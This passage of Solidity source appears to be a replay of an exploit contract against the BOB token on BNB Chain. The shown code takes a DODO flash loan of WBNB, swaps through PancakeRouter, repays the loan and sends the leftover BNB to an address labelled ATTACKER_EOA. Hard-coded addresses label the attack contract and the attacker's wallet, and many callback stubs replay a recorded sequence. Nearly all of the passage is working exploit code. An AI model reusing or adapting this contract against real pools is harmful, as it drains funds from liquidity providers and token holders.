                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback126() internal {
        {
            uint256 repaymentAmount = 100000000000000000000;
            IERC20Like(Addresses.WBNB).transfer(Addresses.DPP_ADVANCED, repaymentAmount);
        }
    }

    function _handleFlashLoanCall() internal {
        replayedCallback2 = true;
    }

    function _handleCallback2() internal {
        replayedCallback3 = true;
    }

    function _handleCallback3() internal {
        replayedCallback4 = true;
    }

    function _handleCallback4() internal {
        replayedCallback5 = true;
    }

    function _handleCallback5() internal {
        replayedCallback6 = true;
    }

    function _handleCallback6() internal {
        replayedCallback7 = true;
    }

    function _handleCallback7() internal {
        replayedCallback8 = true;
    }

    function _handleCallback8() internal {
        replayedCallback9 = true;
    }

    function _handleCallback9() internal {
        replayedCallback10 = true;
    }

    function _executeDodoBorrow() internal {
        _startDodoFlashLoan();
        _snapshotWbnb();
        _unwrapAndSendBnb();
    }

    function _startDodoFlashLoan() internal {
        {
            bytes memory callbackData = hex"00";
            IDPPAdvanced(Addresses.DPP_ADVANCED).flashLoan(100000000000000000000, 0, address(this), callbackData);
        }
    }

    function _snapshotWbnb() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _unwrapAndSendBnb() internal {
        uint256 profitWbnb = 3014818844900880704;
        IWBNB(Addresses.WBNB).withdraw(profitWbnb);

        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 3014911194134545218) nativeTransferAmount = 3014911194134545218;
        (bool ok,) = payable(Addresses.ATTACKER_EOA).call{value: nativeTransferAmount}("");
        ok;
    }

    receive() external payable {
        if ((address(this) == address(this)
                    && (msg.sender == address(this) || msg.sender == Addresses.PANCAKE_ROUTER))) {
            _routerNativeCb();
        }
    }

    function DPPFlashLoanCall(address borrower, uint256 baseAmount, uint256 quoteAmount, bytes calldata callbackData)
        external
        payable
    {
        borrower;
        baseAmount;
        quoteAmount;
        callbackData;
        if (!replayedCallback1) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x84800812) {
            uint256 callbackSequenceIndex = _nextDispatch(0x84800812);
            if (callbackSequenceIndex == 0) {
                if (!replayedCallback9) _handleCallback8();
                return;
            }
            if (callbackSequenceIndex == 1) {
                if (!replayedCallback8) _handleCallback7();
                return;
            }
            if (callbackSequenceIndex == 2) {
                if (!replayedCallback2) _handleFlashLoanCall();
                return;
            }
            if (callbackSequenceIndex == 3) {
                if (!replayedCallback3) _handleCallback2();
                return;
            }
            if (callbackSequenceIndex == 4) {
                if (!replayedCallback10) _handleCallback9();
                return;
            }
            if (callbackSequenceIndex == 5) {
                if (!replayedCallback6) _handleCallback5();
                return;
            }
            if (callbackSequenceIndex == 6) {
                if (!replayedCallback7) _handleCallback6();
                return;
            }
            if (callbackSequenceIndex == 7) {
                if (!replayedCallback4) _handleCallback3();
                return;
            }
            if (callbackSequenceIndex == 8) {
                if (!replayedCallback5) _handleCallback4();
                return;
            }
            if (!replayedCallback9) _handleCallback8();
            return;
        }
        if (msg.sig == 0x9836a84c) {
            _executeDodoBorrow();
            return;
        }
        _routerNativeCb();
    }

    function _routerNativeCb() internal {
        if (
            address(this) == address(this)
                && (msg.sender == address(this) || msg.sender == Addresses.PANCAKE_ROUTER)
        ) _consumeEntryCb();
        return;
    }

    function _consumeEntryCb() internal {
        uint256 callbackIndex = _nextEntryCb(11);
        if (callbackIndex == 0) {
            return;
        }
        if (callbackIndex == 1) {
            return;
        }
        if (callbackIndex == 2) {
            return;
        }
        if (callbackIndex == 3) {
            return;
        }
        if (callbackIndex == 4) {
            return;
        }
        if (callbackIndex == 5) {
            return;
        }
        if (callbackIndex == 6) {
            return;
        }
        if (callbackIndex == 7) {
            return;
        }
        if (callbackIndex == 8) {
            return;
        }
        if (callbackIndex == 9) {
            return;
        }
    }

    bool private replayedCallback1;
    bool private replayedCallback2;
    bool private replayedCallback3;
    bool private replayedCallback4;
    bool private replayedCallback5;
    bool private replayedCallback6;
    bool private replayedCallback7;
    bool private replayedCallback8;
    bool private replayedCallback9;
    bool private replayedCallback10;

    mapping(bytes4 => uint256) private _callbackCursor;
    mapping(uint256 => uint256) private _entryCursor;

    function _nextDispatch(bytes4 callbackSig) internal returns (uint256 ordinal) {
        ordinal = _callbackCursor[callbackSig];
        _callbackCursor[callbackSig] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCursor[index];
        _entryCursor[index] = ordinal + 1;
    }

    function _buyExactBob(uint256 bobAmountOut, uint256 wbnbSpendLimit) internal {
        if (wbnbSpendLimit == 0) return;
        if (IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER) < wbnbSpendLimit) {
            IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
        }
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .swapTokensForExactTokens(
                bobAmountOut,
                wbnbSpendLimit,
                _addressArray2(Addresses.WBNB, Addresses.BOB),
                Addresses.PANCAKE_ROUTER,
                1702803679
            );
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ATTACK_CONTRACT = 0x0fe1983B8972630C866FE77aD873a66Ec598B685;
    address internal constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant BOB = 0x700eE24c350739e323Dcf6A50Ae3E7A3329C86aE;
    address internal constant CAKE_LP = 0x7CafdAaa0ba0F471c800DBaca94bDB943311939d;
    address internal constant DPP_ADVANCED = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant ATTACKER_EOA = 0xcb733F075ae67A83A9C5f38A0864596E338A0106;
}

interface ICake_LP {
    function getReserves() external view;
    function mint(address) external returns (uint256);
    function skim(address) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountOut(uint256, uint256, uint256) external view returns (uint256);
    function quote(uint256, uint256, uint256) external view returns (uint256);
    function removeLiquidityETHSupportingFeeOnTransferTokens(address, uint256, uint256, uint256, address, uint256)
        external
        returns (uint256);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function withdraw(uint256) external;
}
